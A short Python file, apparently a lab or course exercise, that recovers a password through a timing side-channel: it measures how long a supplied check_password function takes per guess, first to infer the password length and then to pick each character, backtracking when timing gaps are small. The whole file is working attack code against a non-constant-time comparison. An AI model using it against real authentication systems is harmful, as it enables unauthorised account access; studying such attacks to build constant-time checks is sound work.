from typing import Callable
import time
import numpy as np

def online_attack(check_password: Callable) -> str:
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    length = find_length(check_password)
    guessed_password = ['@'] * length
    maxTime = np.zeros(length)
    i = 0

    while i < length:
        times = np.zeros(len(charset))

        if i == length - 1:
            for char in charset:
                guessed_password[i] = char
                curr_pwd = ''.join(guessed_password)
                if check_password(curr_pwd):
                    return curr_pwd
                if char == charset[-1]:
                    i = i//2
        else:
 
            for j in range(len(charset)):
                guessed_password[i] = charset[j]
                curr_pwd = ''.join(guessed_password)
                
                start = time.perf_counter()
                check_password(curr_pwd)
                times[j] = time.perf_counter() - start
            
            maxIndex = np.argmax(times)
            current_max_time = times[maxIndex]


            if current_max_time - maxTime[i - 1] >= 0.0003:  
                guessed_password[i] = charset[maxIndex]
                maxTime[i] = current_max_time
                i += 1
            else:
                print("Revert, current index is", i, "Max Time Difference:", current_max_time - maxTime[i - 1], "current passward:", ''.join(guessed_password))
                i = max(0, i - 1)

    return ''.join(guessed_password)


def find_length(check_password: Callable) -> int:

    maxTime = -0.001
    true_length = 0

    for len in range(5, 11):
        guess = '/' * len 
        start = time.perf_counter()
        check_password(guess)
        time_taken = time.perf_counter() - start

        if time_taken > maxTime:
            maxTime = time_taken
            true_length = len

    return true_length